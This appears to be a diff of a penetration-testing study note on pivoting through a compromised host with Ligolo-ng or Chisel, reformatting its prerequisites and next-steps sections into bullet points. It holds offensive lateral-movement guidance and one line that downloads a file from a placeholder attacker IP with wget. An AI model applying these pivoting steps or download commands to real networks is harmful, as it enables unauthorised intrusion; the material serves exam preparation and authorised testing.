@@ -12,9 +12,15 @@ leads_to:
 
 ## Prerequisites
 
-A shell on a machine with access to a network segment your attacker box can't reach directly. The pivot host must have outbound TCP connectivity to your attacker IP. `ipconfig /all` or `ip a` revealing multiple NICs or routes is your indicator.
+- A shell on a machine with access to a network segment your attacker box can't reach directly
 
-Pivoting routes your attack traffic through a compromised host to reach segments that are otherwise unreachable. Every foothold should immediately be checked for additional NICs, route table entries, and internal listeners — these indicate pivot opportunities. Ligolo-ng is the cleanest option for exam environments (no proxychains overhead, tools work natively). Chisel is more portable and firewall-friendly for restrictive egress rules.
+- The pivot host must have outbound TCP connectivity to your attacker IP
+
+- `ipconfig /all` or `ip a` revealing multiple NICs or routes is your indicator
+
+- Every foothold should be checked immediately for additional NICs, routes, and internal listeners
+
+- Ligolo-ng is cleanest for exam environments (no proxychains overhead); Chisel is more portable and firewall-friendly for restrictive egress
 
 ## Quick Win
 
@@ -120,4 +126,8 @@ wget http://ATTACKER_IP:8000/file -O /tmp/file
 
 ## Leads To
 
-Pivot established → restart the entire recon cycle on the new segment: nmap-scan all hosts, smb-enum and ldap-enum if AD is present. Ligolo-ng is cleaner for exam environments — direct tool usage without proxychains. New subnets often contain additional domain controllers, internal services, or targets that were not reachable from the initial foothold.
+- Pivot established → restart the recon cycle on the new segment: `nmap-scan` all hosts, then `smb-enum`/`ldap-enum` if AD is present
+
+- Ligolo-ng is cleaner for exam environments — direct tool usage without proxychains
+
+- New subnets often contain additional domain controllers, internal services, or targets unreachable from the initial foothold
